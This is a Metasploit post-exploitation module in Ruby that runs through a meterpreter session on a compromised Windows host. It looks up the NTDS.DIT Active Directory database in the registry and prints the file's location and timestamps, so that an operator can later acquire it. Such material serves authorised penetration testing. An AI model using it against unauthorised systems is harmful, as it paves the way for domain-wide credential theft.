##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Post Windows Gather NTDS.DIT Location',
      'Description'  => %q{
        This module will find the location of the NTDS.DIT file (from the Registry),
        check that it exists, and display its location on the screen, which is useful
        if you wish to manually acquire the file using ntdsutil or vss.
      },
      'Author'       => ['Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>'],
      'License'      => MSF_LICENSE,
      'Platform'     => ['win'],
      'SessionTypes' => ['meterpreter']
    ))
  end

  def run
    # Find the location of NTDS.DIT in the Registry
    ntds = registry_getvaldata('HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters', 'DSA Database file')
    unless ntds
      print_error('Unable to find the location of NTDS.DIT')
      return
    end

    if file?(ntds)
      f = client.fs.file.stat(ntds)
      print_line("NTDS.DIT is located at: #{ntds}")
      print_line("      Size: #{f.size.to_s} bytes")
      print_line("   Created: #{f.ctime.to_s}")
      print_line("  Modified: #{f.mtime.to_s}")
      print_line("  Accessed: #{f.atime.to_s}")
    else
      print_error("NTDS.DIT is reportedly located at `#{ntds}', but the file does not appear to exist")
    end
  end
end
